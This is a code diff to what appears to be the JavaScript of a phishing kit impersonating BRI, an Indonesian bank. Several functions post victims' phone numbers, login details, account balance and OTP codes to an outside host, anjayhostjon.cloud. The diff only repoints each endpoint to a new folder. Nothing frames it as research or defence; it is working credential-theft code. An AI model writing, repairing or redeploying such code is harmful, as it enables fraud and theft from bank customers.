@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://anjayhostjon.cloud/bri/v4-putra/no.php',
+      url: 'https://anjayhostjon.cloud/bri/v4-putrax/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -34,7 +34,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://anjayhostjon.cloud/bri/v4-putra/sudah.php',
+      url: 'https://anjayhostjon.cloud/bri/v4-putrax/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -64,7 +64,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://anjayhostjon.cloud/bri/v4-putra/saldosdh.php',
+      url: 'https://anjayhostjon.cloud/bri/v4-putrax/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -98,7 +98,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://anjayhostjon.cloud/bri/v4-putra/otpsdh.php',
+      url: 'https://anjayhostjon.cloud/bri/v4-putrax/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -130,7 +130,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://anjayhostjon.cloud/bri/v4-putra/belum.php',
+        url: 'https://anjayhostjon.cloud/bri/v4-putrax/belum.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -163,7 +163,7 @@ function sendOtp() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://anjayhostjon.cloud/bri/v4-putra/otpblm.php',
+        url: 'https://anjayhostjon.cloud/bri/v4-putrax/otpblm.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
